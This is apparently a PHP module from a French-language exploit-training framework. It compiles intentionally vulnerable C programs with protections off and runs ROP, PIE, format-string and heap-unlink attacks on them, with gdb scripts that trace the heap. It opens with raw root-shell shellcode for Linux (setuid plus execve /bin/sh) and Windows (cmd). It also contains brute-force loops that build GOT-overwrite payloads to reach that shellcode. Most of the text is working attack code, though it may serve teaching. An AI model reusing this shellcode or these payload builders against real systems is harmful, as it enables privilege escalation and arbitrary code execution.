\\x31\\xc9\\x8d\\x41\\x17\\xcd\\x80\\x51\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x8d\\x41\\x0b\\x89\\xe3\\xcd\\x80
		27 bytes setuid(0) ^ execve(\"/bin/sh\", 0, 0)
\\x6a\\x17\\x58\\x31\\xdb\\xcd\\x80\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x99\\x31\\xc9\\xb0\\x0b\\xcd\\x80
		29 bytes root bash -> setuid(0) + execve(\"/bin/sh\",...)
\\x31\\xdb\\x8d\\x43\\x17\\xcd\\x80\\x53\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80 ");
		$this->pause();
		$this->article("Shellcode Win 32 Bits", "
		11 bytes -> win32/xp pro sp3 MessageBox
\\x33\\xd2\\x52\\x52\\x52\\x52\\xe8\\xbe\\xe9\\x44\\x7d
		23 bytes -> cmd xp sp2 EN
\\x8b\\xec\\x68\\x65\\x78\\x65\\x20\\x68\\x63\\x6d\\x64\\x2e\\x8d\\x45\\xf8\\x50\\xb8\\x8D\\x15\\x86\\x7C\\xff\\xd0
		32 bytes -> cmd xp sp2 FR
\\x8B\\xEC\\x33\\xFF\\x57\\xC6\\x45\\xFC\\x63\\xC6\\x45\\xFD\\x6D\\xC6\\x45\\xFE\\x64\\xC6\\x45\\xF8\\x01\\x8D\\x45\\xFC\\x50\\xB8\\xC7\\x93\\xBF\\x77\\xFF\\xD0");
		$this->pause();
	
	
	
		$hex_date = $this->msf2c("date");
		$this->hex2exec($hex_date);$this->pause();
		$this->hex2graph($hex_date);$this->pause();
		$this->notify("END SHELLCODE");
	
	}
	
	
	public function poc4bof2ret2pie(){	// OK
		$this->start("PIE","");
		/*
		$name = "ret2pie32l";
		$rep_path = "$this->dir_tmp/$name";
		if (file_exists($rep_path)) system("rm -rv $rep_path");
		$this->create_folder($rep_path);
		system("cp -v $this->dir_c/$name.c $rep_path/$name.c");
		$bin = new file("$rep_path/$name.c"); // add -static
		$this->note("remove -z norelro -z execstack ASLR=yes ASCII_ARMOR=yes ");
		$ret2pie = $bin->file_c2elf("-ggdb -fno-stack-protector -mpreferred-stack-boundary=2 -fno-pie -m32 -mtune=i386 -ldl");
		$file_bin = new ret2pie4linux($ret2pie->file_path);
		$this->requette("$file_bin->file_path ;$file_bin->file_path  ");
		$this->note("Compilation using the default compiler settings will produce the same output on each execution");
		$this->pause();
		

		$name = "ret2pie32l2";
		$rep_path = "$this->dir_tmp/$name";
		if (file_exists($rep_path)) system("rm -rv $rep_path");
		$this->create_folder($rep_path);
		system("cp -v $this->dir_c/$name.c $rep_path/$name.c");
		$bin = new file("$rep_path/$name.c"); // add -static
		$this->note("remove -fno-pie -z norelro -z execstack ASLR=yes ASCII_ARMOR=yes ");
		$ret2pie2 = $bin->file_c2elf("-ggdb -fno-stack-protector -mpreferred-stack-boundary=2 -pie -fpie -m32 -mtune=i386 -ldl");
		$file_bin2 = new ret2pie4linux($ret2pie2->file_path);
		$this->requette("$file_bin2->file_path ;$file_bin2->file_path  ");
		$this->note("recompiling the same program as a Position Independent Executable (PIE) produces different results on each execution");
		$this->pause();
		$file_bin->elf2info();
		$file_bin2->elf2info();
		$this->remarque("The randomisation mechanism used in Position Independent Executables is essentially the same as that used by shared libraries. 
		In fact, the result of building a Position Independent Executable (PIE) is actually a hybrid between an executable and a Dynamic Shared Object (DSO): the Executable and Linkable Format (ELF) produced is recognised as a shared library");
		$this->pause();
		$file_bin->elf2sections4static();$this->pause();
		$file_bin2->elf2sections4static();$this->pause();
		$this->requette("diff $file_bin->file_path $file_bin2->file_path");$this->pause();
		$this->remarque("Into PIE Binary -> Section .interp -> offset (position independent) address
		and a new section was created -> .data.rel.ro 
		the ELF sections are all using absolute addresses in the non-PIE version of the application, whereas because the location of a PIE binary cannot be loaded into the same fixed location in memory every time the application is run, the PIE version utilises relative addresses. 
		");
		$this->pause();
		*/
		$this->os2aslr4yes();
		$name = "ret2rop32l";
		$rep_path = "$this->dir_tmp/$name";
		if (file_exists($rep_path)) system("rm -rv $rep_path");
		$this->create_folder($rep_path);
		system("cp -v $this->dir_c/$name.c $rep_path/$name.c");
		$bin = new file("$rep_path/$name.c"); // add -static
		$this->note("remove -fno-pie -z norelro -z execstack ASLR=yes ASCII_ARMOR=yes ");
		$ret2pie3 = $bin->file_c2elf("-ggdb -fno-stack-protector -mpreferred-stack-boundary=2 -pie -fpie -m32 -mtune=i386 -ldl");
		$file_bin3 = new ret2pie4linux($ret2pie3->file_path);
		
		$overflow = $file_bin3->elf2fuzzeling("","");
		$offset_eip = $file_bin3->elf2offset4eip("",$overflow,"");
		
		for($i=0;$i<100;$i++){
		$this->article("I/100:",$i);
		$file_bin3->ret2pie4linux_system($offset_eip);
		}
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		

	}
	
	
	
	
	

	public function poc4bof2ret2rop(){	// OK
		$this->start("ROP","");
		$this->os2aslr4yes();
		// #############################################################################
		$this->gtitre( "bypass ASLR, NX, ASCII ARMOR, SSP and RELRO protection in the same time" );
		$this->article ( "Ropping", "Le ropping est une technique de ré-utilisation de code au même titre que ret2lib, ret2esp. 
Elle est utilisé afin de bypasser le DEP sans code ou pour rendre l'exécution de code possible.
Celà consiste à chaîner plusieurs séquences d'instructions terminant par RET. 
On appelle ces séquences des gadgets, un gadget effectue une action bien précise comme une addition ou autre.
Pour résumer contrairement au return-to-libc à la place de faire des retours vers des fonctions on fait des retours vers des séquences d'instructions." );

		$name = "ret2rop32l";
		$rep_path = "$this->dir_tmp/$name";
		if (file_exists($rep_path)) system("rm -rv $rep_path");
		$this->create_folder($rep_path);
		system("cp -v $this->dir_c/$name.c $rep_path/$name.c");
		$bin = new file("$rep_path/$name.c"); // add -static
		$this->note("remove  -z norelro -z execstack ASLR=yes ASCII_ARMOR=yes ");
		$ret2rop = $bin->file_c2elf("-ggdb -fno-stack-protector -mpreferred-stack-boundary=2 -fno-pie -m32 -mtune=i386 -static");
		$file_bin = new ret2rop4linux($ret2rop->file_path);
		$overflow = $file_bin->elf2fuzzeling("","");
		$offset_eip = $file_bin->elf2offset4eip("",$overflow,"");
		$file_bin->ret2rop4linux_payload($offset_eip); // OK
		$this->pause();
		// #############################################################################
	}



	
	
	public function poc4bof2ret2fmt4linux(){
		$this->chapitre("Format String" );
		
		$this->chapitre("READING & WRITING IN ARBITRARY MEMORY LOCATION" );
		$name = "poc";
		$rep_path = "$this->dir_tmp/ret2fmt4linux";
		if (!is_dir($rep_path)) $this->create_folder($rep_path);
		$rep_path = "$this->dir_tmp/ret2fmt4linux/$name";
		if (!is_dir($rep_path)) $this->create_folder($rep_path);
		$this->img("$this->dir_img/bof/fmt_str_sommaire.png");
		$this->os2aslr4no();$this->pause();
		
		
		/*
		$name = "ret2fmt4linux_read_mem";
		system("cp -v $this->dir_c/$name.c $rep_path/$name.c");
		$file_c = new FILE("$rep_path/$name.c");
		$fmt1 = $file_c->file_c2elf(" -fno-stack-protector  -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		$fmt1_obj = new ret2fmt4linux($fmt1);
		$fmt1_obj->ret2fmt_display_format(); // ok
		$fmt1_obj->ret2fmt_display_arbitrary_locations(1,150); // ok
		$this->pause();
		
		$name = "ret2fmt4linux_write_mem";
		system("cp -v $this->dir_c/$name.c $rep_path/$name.c");
		$file_c = new FILE("$rep_path/$name.c");
		$fmt2 = $file_c->file_c2elf(" -fno-stack-protector  -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		$fmt2_obj = new ret2fmt4linux($fmt2);
		$fmt2_obj->ret2fmt_writing_arbitrary_location(); // ok
		$this->img("$this->dir_img/bof/ret2fmt_win_lin.png");
		$this->pause();// add stipped
		
		
		$this->chapitre("GET Shellcode with Format String " );
		$this->img("$this->dir_img/bof/fmt_str_sommaire.png");
		$this->os2aslr4no();$this->pause();
		*/
		$name = "fmt_str_8";
		system("cp -v $this->dir_c/$name.c $rep_path/$name.c");
		$file_c = new FILE("$rep_path/$name.c");
		$fmt3 = $file_c->file_c2elf(" -fno-stack-protector  -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		
		
		$fmt3_obj = new ret2fmt4linux($fmt3);
		//$fmt3_obj->ret2fmt_pointeur_fonction(); // OK
		$this->pause();
		$fmt3_obj->ret2fmt_all(); // OK
		$this->pause();
		//$fmt3_obj->ret2fmt_exploit_exemple(); // OK
		$this->pause();
		$this->article("Trouver des Vulnerabilités Format String in White Box", "grep -nE 'printf|fprintf|sprintf|snprintf|snprintf|vprintf|vfprintf|vsnprintf|syslog|setproctitle' *.c" );
		
	}
	

	public function poc4bof2ret2lib(){
		$this->poc4bof2ret2lib4linux();
	}
	
	
	public function poc4bof2ret2heap4linux(){
		$this->chapitre(__FUNCTION__);
		//$this->img("$this->dir_img/bof/fmt_str_sommaire.png");
		//$this->pause();

		
		####################### OK ########################################################
		$name = "ret2heap4linux_poc13";
		$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
		$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
		$file_c = new FILE("$this->dir_tmp/$name.c");

		$programme = $file_c->file_c2elf(" -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		
		$file_bin = new ret2heap4linux($programme);
		$file_bin->elf2checksec();
		//$offset_eip = $file_bin->elf2fuzzeling("","BBBB CCCC");
		$offset_eip = 256;
		$cmd = "python -c 'print \"\\x41\"*$offset_eip+\" \"+\"BBBB\"+\" \"+\"CCCC\"'";
		$file_bin->requette("$file_bin->file_path \$($cmd)");
		$file_bin->elf2heap4display(200, $cmd, "");
		$heap_start = $file_bin->elf2heap4start($cmd);
		$malloc1 = $file_bin->elf2ltrace("`$cmd`", " | grep malloc | head -1 | cut -d= -f2");
		$addr_chunk = $file_bin->addr2sub($malloc1,8);
		$display_int = $offset_eip * 2;
		$display_w = $display_int."wx";
		$this->requette("echo \"
b 59
commands 1
    x/$display_w $addr_chunk
    bt full
    c
end
	run \$($cmd)
\" > $file_bin->file_dir/$file_bin->file_name".".gdb");
		$file_bin->requette("gdb -q $file_bin->file_path --batch -x $file_bin->file_dir/$file_bin->file_name".".gdb ");
		
		$this->pause();
		exit();
		
		
		$this->requette("echo \"
set pagination off
set logging on
b 13
commands 1
    x/$display_w $addr_chunk
    c
end
		    
b 14
commands 2
    x/$display_w $addr_chunk
    c
end
		    
b 16
commands 3
    x/$display_w $addr_chunk
    c
end
		    
b 18
commands 4
    x/$display_w $addr_chunk
    c
end
		    
b 19
commands 5
    x/$display_w $addr_chunk
    c
end
		    
b 57
commands 6
    x/$display_w $addr_chunk
    c
end
		    
b 58
commands 7
    x/$display_w $addr_chunk
    c
end
		    
b 59
commands 8
    x/$display_w $addr_chunk
    c
end

run \$($cmd)
quit\" > $file_bin->file_dir/$file_bin->file_name".".gdb");
		$file_bin->requette("gdb -q $file_bin->file_path --batch -x $file_bin->file_dir/$file_bin->file_name".".gdb ");
		
		
		
		
		exit();
		
		####################### OK ########################################################
		$name = "ret2heap4linux_poc11";
		$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
		$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
		$file_c = new FILE("$this->dir_tmp/$name.c");
		
		
		$programme = $file_c->file_c2elf(" -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		
		$file_bin = new ret2heap4linux($programme);
		$file_bin->elf2checksec();
		//$offset_eip = $file_bin->elf2fuzzeling("","");
		$offset_eip = 99;
		$cmd = "python -c 'print \"\\x41\"*$offset_eip'";
		$file_bin->requette("$file_bin->file_path \$($cmd)");
		$file_bin->elf2heap4display(400, $cmd, "");
		$heap_start = $file_bin->elf2heap4start($cmd);
		$malloc1 = $file_bin->elf2ltrace("", " | grep malloc | head -1 | cut -d= -f2");
		$addr_chunk = $file_bin->addr2sub($malloc1,8);
		$display_int = $offset_eip * 2;
		$display_w = $display_int."wx";
		$this->requette("echo \"
set logging on
b 71
commands 1
    x/$display_w $addr_chunk
    bt full
    c
end
	run \$($cmd)

set logging off
\" > $file_bin->file_dir/$file_bin->file_name".".gdb");
		$file_bin->requette("gdb -q $file_bin->file_path --batch -x $file_bin->file_dir/$file_bin->file_name".".gdb ");

		$this->pause();
		$this->requette("echo \"
set pagination off
set logging on
b 20
commands 1
    x/$display_w $addr_chunk
    c
end
		    
b 21
commands 2
    x/$display_w $addr_chunk
    c
end
		    
b 22
commands 3
    x/$display_w $addr_chunk
    c
end

b 43
commands 4
    x/$display_w $addr_chunk
    c
end
		    		    
b 53
commands 5
    x/$display_w $addr_chunk
    c
end
		    
b 63
commands 6
    x/$display_w $addr_chunk
    c
end 		    
		    
b 66
commands 7
    x/$display_w $addr_chunk
    c
end
		    
b 67
commands 8
    x/$display_w $addr_chunk
    c
end
		    
b 68
commands 9
    x/$display_w $addr_chunk
    c
end
		    
b 71
commands 10
    x/$display_w $addr_chunk
    c
end
run \$($cmd)
		    
set logging off
quit\" > $file_bin->file_dir/$file_bin->file_name".".gdb");
		$file_bin->requette("gdb -q $file_bin->file_path --batch -x $file_bin->file_dir/$file_bin->file_name".".gdb ");
		
		$this->pause();
	
		####################### OK ########################################################
		$name = "ret2heap4linux_malloc_large_size";
		$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
		$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
		$file_c = new FILE("$this->dir_tmp/$name.c");
		
		$this->requette("gedit $file_c->file_path");
		$programme = $file_c->file_c2elf(" -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		
		$file_bin = new ret2heap4linux($programme);
		$file_bin->elf2checksec();
		//$offset_eip = $file_bin->elf2fuzzeling("","");
		$offset_eip = 99;
		$cmd = "python -c 'print \"\\x41\"*$offset_eip'";
		$file_bin->requette("$file_bin->file_path \$($cmd)");
		$file_bin->elf2heap4display(400, $cmd, "");
		$heap_start = $file_bin->elf2heap4start($cmd);
		$malloc1 = $file_bin->elf2ltrace("", " | grep malloc | head -1 | cut -d= -f2");
		$addr_chunk = $file_bin->addr2sub($malloc1,8);
		$display_int = $offset_eip * 2;
		$display_w = $display_int."wx";
		$this->requette("echo \"
set pagination off
set logging on
b 20
commands 1
    x/$display_w $addr_chunk
    c
end

b 21
commands 2
    x/$display_w $addr_chunk
    c
end

b 22
commands 3
    x/$display_w $addr_chunk
    c
end


b 23
commands 4
    x/$display_w $addr_chunk
    c
end

b 24
commands 5
    x/$display_w $addr_chunk
    c
end

b 25
commands 6 
    x/$display_w $addr_chunk
    c
end

b 26
commands 7 
    x/$display_w $addr_chunk
    c
end


b 53
commands 8 
    x/$display_w $addr_chunk
    c
end

b 63
commands 9 
    x/$display_w $addr_chunk
    c
end

b 73
commands 10 
    x/$display_w $addr_chunk
    c
end

b 83
commands 11 
    x/$display_w $addr_chunk
    c
end

b 93
commands 12 
    x/$display_w $addr_chunk
    c
end

b 103
commands 13 
    x/$display_w $addr_chunk
    c
end

b 113
commands 14 
    x/$display_w $addr_chunk
    c
end


b 116
commands 15 
    x/$display_w $addr_chunk
    c
end

b 117
commands 16 
    x/$display_w $addr_chunk
    c
end

b 118
commands 17 
    x/$display_w $addr_chunk
    c
end

b 119
commands 18 
    x/$display_w $addr_chunk
    c
end

b 120
commands 19 
    x/$display_w $addr_chunk
    c
end

b 121
commands 20 
    x/$display_w $addr_chunk
    c
end

b 122
commands 21 
    x/$display_w $addr_chunk
    c
end

b 125
commands 22
    x/$display_w $addr_chunk
    c
end

run \$($cmd)

set logging off
quit\" > $file_bin->file_dir/$file_bin->file_name".".gdb");
		$file_bin->requette("gdb --batch -q --command=$file_bin->file_dir/$file_bin->file_name".".gdb --args $file_bin->file_path ");
		
		
		$this->pause();
		
		
		
		####################### OK ########################################################
		$name = "ret2heap4linux_malloc_small_size";
		$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
		$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
		$file_c = new FILE("$this->dir_tmp/$name.c");
		
		$this->requette("gedit $file_c->file_path");
		$programme = $file_c->file_c2elf(" -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		
		$file_bin = new ret2heap4linux($programme);
		$file_bin->elf2checksec();
		//$offset_eip = $file_bin->elf2fuzzeling("","");
		$offset_eip = 99;
		$cmd = "python -c 'print \"\\x41\"*$offset_eip'";
		$file_bin->requette("$file_bin->file_path \$($cmd)");
		$file_bin->elf2heap4display(400, $cmd, "");
		$heap_start = $file_bin->elf2heap4start($cmd);
		$malloc1 = $file_bin->elf2ltrace("", " | grep malloc | head -1 | cut -d= -f2");
		$addr_chunk = $file_bin->addr2sub($malloc1,8);
		$display_w = $offset_eip + 4;
		$display_w = $display_int."xb";
		$this->requette("echo \"
b 20
b 21
b 22
b 23
b 24
b 25
b 26
		    
b 53
b 63
b 73
b 83
b 93
b 103
b 113
		    
b 116
b 117
b 118
b 119
b 120
b 121
b 122
b 125
run `$cmd`
x/$display_w $addr_chunk
c
x/$display_w $addr_chunk
c
x/$display_w $addr_chunk
c
x/$display_w $addr_chunk
c
x/$display_w $addr_chunk
c
x/$display_w $addr_chunk
c
x/$display_w $addr_chunk+100
c
x/$display_w $addr_chunk+200
c
x/$display_w $addr_chunk+300
c\" > $file_bin->file_dir/$file_bin->file_name"."_cmd_gdb.txt");
		$file_bin->requette("gdb --batch -q -x $file_bin->file_dir/$file_bin->file_name"."_cmd_gdb.txt $file_bin->file_path ");
		
		$this->pause();
		
		
		
		####################### OK ########################################################
		$name = "ret2heap4linux_poc11";
		$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
		$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
		$file_c = new FILE("$this->dir_tmp/$name.c");
		
		$this->requette("gedit $file_c->file_path");
		$programme = $file_c->file_c2elf(" -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");

		$file_bin = new ret2heap4linux($programme);
		$file_bin->elf2checksec();
		$offset_eip = $file_bin->elf2fuzzeling("","");
		$cmd = "python -c 'print \"\\x41\"*$offset_eip'";
		$file_bin->requette("$file_bin->file_path \$($cmd)");
        $file_bin->elf2heap4display(400, $cmd, "");
        $heap_start = $file_bin->elf2heap4start($cmd);
        $malloc1 = $file_bin->elf2ltrace("", " | grep malloc | head -1 | cut -d= -f2");
        $addr_chunk = $file_bin->addr2sub($malloc1,8);
        $display_int = $offset_eip + 4;
        $display_w = $display_int."xb";
        $this->requette("echo \"
b 20
b 21
b 22
b 43
b 53 
b 63
b 65
b 66
b 67
b 70
run `$cmd`
x/$display_w $addr_chunk
c 
x/$display_w $addr_chunk
c 
x/$display_w $addr_chunk
c 
x/$display_w $addr_chunk
c 
x/$display_w $addr_chunk
c 
x/$display_w $addr_chunk
c 
x/$display_w $addr_chunk+100
c
x/$display_w $addr_chunk+200
c
x/$display_w $addr_chunk+300
c\" > $file_bin->file_dir/$file_bin->file_name"."_cmd_gdb.txt");
        $file_bin->requette("gdb --batch -q -x $file_bin->file_dir/$file_bin->file_name"."_cmd_gdb.txt $file_bin->file_path ");
        
        exit();
		//$offset_eip = $file_bin->elf2fuzzeling("","");
		
		$addr = $file_bin->elf2addr4fonction_prog("winner");
		$addr = $file_bin->hex2rev_32($addr);
		$cmd = "python -c 'print \"\\x41\"*$offset_eip+\"$addr\"'";
		$file_bin->payload2check4norme($cmd, "");
		$query = "$file_bin->file_path \$($cmd)";
		$file_bin->requette($query) ;
		$query = "gdb -q --batch -ex \"r \$($cmd)\" $file_bin->file_path ";
		$file_bin->requette($query) ;$this->pause();
		####################################################################################
		
		exit();
		
		// LD_LIBRARY_PATH= /path/to/new/glibc/lib /path/to/new/glibc/lib/ld-linux.so.2 /path/to/progra
		####################### OK ########################################################
		$name = "ret2heap4linux_poc3"; // 3,
		$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
		$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
		$file_c = new FILE("$this->dir_tmp/$name.c");
		
		$this->requette("gedit $file_c->file_path");
		$programme = $file_c->file_c2elf(" -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		$file_bin = new ret2heap4linux($programme);
		$file_bin->elf2checksec();
		$offset_eip = $file_bin->elf2fuzzeling("","");
		//$offset_eip = 672;
		
		//$offset_eip = $offset_eip -1;
		//$file_bin->elf2ltrace("AAAA", "");
		//$file_bin->shellcode2env4hex(100,);
		$ret = $file_bin->elf2ltrace("", " | grep malloc | head -1 | cut -d= -f2");
		$ret2 = "0xffffcea1";
		$addr_less_4 = "0xfffffff8";
		$addr_less_4_rev = $file_bin->hex2rev_32($addr_less_4);
		$addr_less_5_rev = $file_bin->hex2rev_32($file_bin->addr2sub($addr_less_4,1));
		$shellcode = $file_bin->asm2hex("jmp 16")."\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90".$file_bin->shellcode_bin_sh;
		$addr_shellcode = $file_bin->hex2env($shellcode,0);
		$addr_got = $file_bin->hex2rev_32($file_bin->addr2sub($file_bin->elf2addr4fonction_got("free"),12));
		$privious_size = $file_bin->hex2rev_32("0xfffffff0");
		$size_chuck = $file_bin->hex2rev_32("0xffffffff");
		
		$this->pause();
		for($i=-100;$i<100;$i++){
		    $addr_ret = $file_bin->hex2rev_32($file_bin->addr2sub($ret,$i));
		    $addr_ret2 = $file_bin->hex2rev_32($file_bin->addr2sub($ret2,$i));
		    $addr_shellcode = $file_bin->hex2rev_32($file_bin->addr2sub($addr_shellcode,$i));;
		    for ($j = -10; $j < 30; $j++) {
		        
		        $cmd_unlink = "python -c 'print \"\\x41\"*8+\"$shellcode\"+\"\\x42\"*($offset_eip+$j-16-8-".$this->hex2size($shellcode).")+\"$size_chuck\"+\"$privious_size\"+\"$addr_got\"+\"$addr_ret\"'";
		        $query = "$file_bin->file_path \$($cmd_unlink) 2&>1";
		        $file_bin->payload2check4norme($cmd_unlink, "");
		        $file_bin->requette($query) ;
		        $cmd_unlink = "python -c 'print \"\\x41\"*8+\"$shellcode\"+\"\\x42\"*($offset_eip+$j-16-8-".$this->hex2size($shellcode).")+\"$size_chuck\"+\"$privious_size\"+\"$addr_got\"+\"$addr_ret2\"'";
		        $query = "$file_bin->file_path \$($cmd_unlink) 2&>1";
		        $file_bin->payload2check4norme($cmd_unlink, "");
		        $file_bin->requette($query) ;
		        $cmd = "python -c 'print \"\\x41\"*($offset_eip+$j-16)+\"$size_chuck\"+\"$privious_size\"+\"$addr_got\"+\"$addr_shellcode\"'";
		        $query = "$file_bin->file_path \$($cmd) 2&>1";
		        $file_bin->payload2check4norme($cmd, "");
		        $file_bin->requette($query) ;
		        $cmd = "python -c 'print \"$shellcode\"+\"\\x41\"*($offset_eip+$j-".$this->hex2size($shellcode)."-16)+\"$size_chuck\"+\"$privious_size\"+\"\\x42\"+\"$addr_got\"+\"$addr_ret\"'";
		        $query = "$file_bin->file_path \$($cmd) 2&>1";
		        $file_bin->payload2check4norme($cmd, "");
		        $file_bin->requette($query) ;
		        $cmd = "python -c 'print \"$shellcode\"+\"\\x41\"*($offset_eip+$j-".$this->hex2size($shellcode)."-16)+\"$size_chuck\"+\"$privious_size\"+\"\\x42\"+\"$addr_got\"+\"$addr_ret2\"'";
		        $query = "$file_bin->file_path \$($cmd) 2&>1";
		        $file_bin->payload2check4norme($cmd, "");
		        $file_bin->requette($query) ;		        
		        $cmd_unlink = "python -c 'print \"$size_chuck\"+\"$privious_size\"+\"$shellcode\"+\"\\x42\"*($offset_eip+$j-16-8-".$this->hex2size($shellcode).")+\"$size_chuck\"+\"$privious_size\"+\"$addr_got\"+\"$addr_ret\"'";
		        $query = "$file_bin->file_path \$($cmd_unlink) 2&>1";
		        $file_bin->payload2check4norme($cmd_unlink, "");
		        $file_bin->requette($query) ;
		        $cmd_unlink = "python -c 'print \"$size_chuck\"+\"$privious_size\"+\"$shellcode\"+\"\\x42\"*($offset_eip+$j-16-8-".$this->hex2size($shellcode).")+\"$size_chuck\"+\"$privious_size\"+\"$addr_got\"+\"$addr_ret2\"'";
		        $query = "$file_bin->file_path \$($cmd_unlink) 2&>1";
		        $file_bin->payload2check4norme($cmd_unlink, "");
		        $file_bin->requette($query) ;		        
	
		        /*
		        
		        $cmd_unlink = "python -c 'print \"\\x41\"*8+\"$shellcode\"+\"\\x42\"*($offset_eip+$j-16-8-".$this->hex2size($shellcode).")+\"$addr_less_5_rev\"+\"$addr_less_4_rev\"+\"$addr_got\"+\"$addr_ret\"'";
		        $query = "$file_bin->file_path \$($cmd_unlink) 2&>1";
		        $file_bin->payload2check4norme($cmd_unlink, "");
		        $file_bin->requette($query) ;
		        $cmd_unlink = "python -c 'print \"\\x41\"*8+\"$shellcode\"+\"\\x42\"*($offset_eip+$j-16-8-".$this->hex2size($shellcode).")+\"$addr_less_5_rev\"+\"$addr_less_4_rev\"+\"$addr_got\"+\"$addr_ret2\"'";
		        $query = "$file_bin->file_path \$($cmd_unlink) 2&>1";
		        $file_bin->payload2check4norme($cmd_unlink, "");
		        $file_bin->requette($query) ;		        
		        $cmd = "python -c 'print \"\\x41\"*($offset_eip+$j-16)+\"$addr_less_5_rev\"+\"$addr_less_4_rev\"+\"$addr_got\"+\"$addr_shellcode\"'";
		        $query = "$file_bin->file_path \$($cmd) 2&>1";
		        $file_bin->payload2check4norme($cmd, "");
		        $file_bin->requette($query) ;		        
		        $cmd = "python -c 'print \"$shellcode\"+\"\\x41\"*($offset_eip+$j-".$this->hex2size($shellcode)."-16)+\"$addr_less_5_rev\"+\"$addr_less_4_rev\"+\"\\x42\"+\"$addr_got\"+\"$addr_ret\"'";
		        $query = "$file_bin->file_path \$($cmd) 2&>1";
		        $file_bin->payload2check4norme($cmd, "");
		        $file_bin->requette($query) ;
		        $cmd = "python -c 'print \"$shellcode\"+\"\\x41\"*($offset_eip+$j-".$this->hex2size($shellcode)."-16)+\"$addr_less_5_rev\"+\"$addr_less_4_rev\"+\"\\x42\"+\"$addr_got\"+\"$addr_ret2\"'";
		        $query = "$file_bin->file_path \$($cmd) 2&>1";
		        $file_bin->payload2check4norme($cmd, "");
		        $file_bin->requette($query) ;
		        
		        
		        
		        $cmd_unlink = "python -c 'print \"\\x41\"*8+\"$shellcode\"+\"\\x42\"*($offset_eip+$j-16-8-".$this->hex2size($shellcode).")+\"$addr_less_4_rev\"+\"$addr_less_4_rev\"+\"$addr_got\"+\"$addr_ret\"'";
		        $query = "$file_bin->file_path \$($cmd_unlink) 2&>1";
		        $file_bin->payload2check4norme($cmd_unlink, "");
		        $file_bin->requette($query) ;
		        $cmd_unlink = "python -c 'print \"\\x41\"*8+\"$shellcode\"+\"\\x42\"*($offset_eip+$j-16-8-".$this->hex2size($shellcode).")+\"$addr_less_4_rev\"+\"$addr_less_4_rev\"+\"$addr_got\"+\"$addr_ret2\"'";
		        $query = "$file_bin->file_path \$($cmd_unlink) 2&>1";
		        $file_bin->payload2check4norme($cmd_unlink, "");
		        $file_bin->requette($query) ;
		        $cmd = "python -c 'print \"\\x41\"*($offset_eip+$j-16)+\"$addr_less_4_rev\"+\"$addr_less_4_rev\"+\"$addr_got\"+\"$addr_shellcode\"'";
		        $query = "$file_bin->file_path \$($cmd) 2&>1";
		        $file_bin->payload2check4norme($cmd, "");
		        $file_bin->requette($query) ;
		        
		        $cmd = "python -c 'print \"$shellcode\"+\"\\x41\"*($offset_eip+$j-".$this->hex2size($shellcode)."-16)+\"$addr_less_4_rev\"+\"$addr_less_4_rev\"+\"\\x42\"+\"$addr_got\"+\"$addr_ret\"'";
		        $query = "$file_bin->file_path \$($cmd) 2&>1";
		        $file_bin->payload2check4norme($cmd, "");
		        $file_bin->requette($query) ;
		        $cmd = "python -c 'print \"$shellcode\"+\"\\x41\"*($offset_eip+$j-".$this->hex2size($shellcode)."-16)+\"$addr_less_4_rev\"+\"$addr_less_4_rev\"+\"\\x42\"+\"$addr_got\"+\"$addr_ret2\"'";
		        $query = "$file_bin->file_path \$($cmd) 2&>1";
		        $file_bin->payload2check4norme($cmd, "");
		        $file_bin->requette($query) ;
		        */
		    }
		    
		}
		
		//$file_bin->elf2heap4display($offset_eip/2, $cmd, "");
		
		/*
		 $programme2 = $file_c->file_c2elf("-fsanitize=address -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
		 $file_bin2 = new ret2heap4linux($programme2);
		 $query = "$file_bin2->file_path \$($cmd)";
		 $file_bin2->payload2check4norme($cmd, "");
		 $file_bin2->requette($query) ;$this->pause();
		 */
		
		
		exit();
		
		$shellcode = $file_bin->asm2hex("jmp 0xA")."\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90".$file_bin->shellcode_date_linux;
		$addr_shellcode = $file_bin->hex2rev_32($file_bin->hex2env($shellcode,0));
		$addr_less_4 = $file_bin->hex2rev_32("0xfffffffc");
